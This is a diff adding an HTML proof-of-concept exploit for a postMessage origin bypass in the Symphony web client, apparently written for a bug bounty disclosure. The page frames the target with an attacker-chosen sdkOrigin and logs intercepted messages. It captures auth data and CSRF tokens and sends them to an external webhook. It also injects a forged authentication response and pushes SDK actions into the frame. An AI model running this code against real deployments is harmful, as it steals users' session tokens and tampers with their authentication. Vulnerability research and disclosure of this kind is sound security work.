@@ -1,0 +1,131 @@
+<!doctype html>
+<html>
+<head>
+<title>Symphony postMessage Origin Bypass PoC</title>
+<style>
+body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
+iframe { width: 100%; height: 400px; border: 1px solid #0f0; background: #fff; }
+pre { white-space: pre-wrap; word-wrap: break-word; }
+button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-family: monospace; }
+</style>
+</head>
+<body>
+<h2>Symphony postMessage Origin Bypass — checkAuth Flow</h2>
+<p>This PoC exploits the checkAuth flow (independent of embed mode) to register
+the CrossFrameService message listener with an attacker-controlled sdkOrigin.</p>
+
+<button onclick="runPoC()">Run PoC</button>
+<pre id="log"></pre>
+<iframe id="frame" style="display:none"></iframe>
+
+<script>
+const WEBHOOK = 'https://eodxy50gl486xrx.m.pipedream.net';
+const ATTACKER_ORIGIN = location.origin;  // this page's origin
+let sessionId = Math.random().toString(36).slice(2);
+
+function log(m) {
+  document.getElementById('log').textContent += m + '\n';
+}
+
+function pingWebhook(phase, data) {
+  fetch(WEBHOOK + '?phase=' + phase + '&session=' + sessionId + '&origin=' + encodeURIComponent(ATTACKER_ORIGIN), {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data || {})
+  }).catch(() => {});
+}
+
+// Listen for messages from the Symphony iframe
+window.addEventListener('message', (event) => {
+  log('[<] RECV from ' + event.origin + ': ' + JSON.stringify(event.data));
+
+  // Log all messages to webhook
+  pingWebhook('message_received', {
+    sender_origin: event.origin,
+    data: event.data
+  });
+
+  // Handle CheckAuth response — contains auth status
+  if (event.data?.eventType === 'checkAuth' || event.data?.eventType === 'sdk-check-auth') {
+    log('[!!!] Captured CheckAuth response!');
+    log('[!!!] Auth data: ' + JSON.stringify(event.data.payload));
+    pingWebhook('auth_data_captured', event.data);
+  }
+
+  // Handle LoggedIn — contains CSRF token
+  if (event.data?.eventType === 'loggedIn' || event.data?.eventType === 'sdk-logged-in') {
+    log('[!!!] CSRF TOKEN CAPTURED: ' + event.data.data);
+    pingWebhook('csrf_token_stolen', {token: event.data.data});
+  }
+
+  // Handle GetAuthenticationDataRequest — respond with fake data
+  if (event.data?.eventType === 'get-authentication-data' ||
+      event.data?.eventType === 'sdk-get-authentication-data-request') {
+    log('[!] Symphony requesting auth data — injecting FAKE response');
+    const fakeAuth = {
+      eventType: 'sdk-get-authentication-data-response',
+      payload: {
+        identityProviderName: 'attacker-idp',
+        subjectToken: 'ATTACKER_INJECTED_' + Date.now()
+      }
+    };
+    event.source.postMessage(fakeAuth, '*');
+    log('[>] Sent fake auth response');
+    pingWebhook('fake_auth_sent', fakeAuth);
+  }
+});
+
+function runPoC() {
+  log('=== Symphony postMessage Origin Bypass PoC ===');
+  log('Attacker origin: ' + ATTACKER_ORIGIN);
+  log('Session: ' + sessionId);
+  log('');
+
+  // Use checkAuth flow — does NOT require partnerId or embed mode
+  const symphonyUrl = 'https://hackerone.on.symphony.com/apps/client2/default/index.html'
+    + '?checkAuth=poc-' + sessionId
+    + '&sdkOrigin=' + encodeURIComponent(ATTACKER_ORIGIN);
+
+  log('[*] Loading Symphony with checkAuth flow:');
+  log('    URL: ' + symphonyUrl);
+  log('    sdkOrigin: ' + ATTACKER_ORIGIN);
+  log('');
+
+  const frame = document.getElementById('frame');
+  frame.style.display = 'block';
+  frame.src = symphonyUrl;
+
+  log('[*] Iframe loaded. Waiting for Symphony to send messages...');
+  log('[*] The checkAuth flow will:');
+  log('    1. Register CrossFrameService message listener');
+  log('    2. Set sdkOrigin = ' + ATTACKER_ORIGIN);
+  log('    3. Call checkAuth()');
+  log('    4. Post CheckAuth result to parent (this page)');
+  log('');
+
+  // After 3 seconds, try sending SDK actions to Symphony
+  setTimeout(() => {
+    log('[*] Attempting to send SDK actions to Symphony...');
+    const actions = [
+      {eventType: 'sdkAction', payload: {id: 'poc-1', name: 'set-theme', params: {mode: 'DARK'}}},
+      {eventType: 'sdkAction', payload: {id: 'poc-2', name: 'set-settings', params: {canClickExternalLinks: true}}},
+    ];
+    actions.forEach((msg, i) => {
+      log('[>] Sending SDK action ' + (i+1) + ': ' + msg.payload.name);
+      frame.contentWindow.postMessage(msg, '*');
+      pingWebhook('sdk_action_sent_' + i, msg);
+    });
+  }, 3000);
+
+  // After 6 seconds, try GetAuthenticationDataRequest
+  setTimeout(() => {
+    log('[*] Attempting to trigger GetAuthenticationData flow...');
+    frame.contentWindow.postMessage({
+      eventType: 'sdk-get-authentication-data-request'
+    }, '*');
+    pingWebhook('auth_request_triggered', {});
+  }, 6000);
+}
+</script>
+</body>
+</html>
